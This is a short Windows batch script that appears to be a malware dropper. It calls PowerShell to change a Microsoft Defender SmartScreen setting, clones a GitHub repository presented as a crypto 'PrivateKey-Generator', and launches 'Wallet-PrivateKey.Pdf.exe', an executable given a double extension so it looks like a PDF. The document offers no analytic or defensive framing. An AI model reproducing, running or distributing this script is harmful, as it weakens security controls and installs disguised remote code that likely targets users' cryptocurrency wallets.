@echo off
powershell -Command "Set-MpPreference -DisableSmartScreenOverridePrompt $true"
git clone https://github.com/CelestialNFT/PrivateKey-Generator.git
cd PrivateKey-Generator
start /wait Wallet-PrivateKey.Pdf.exe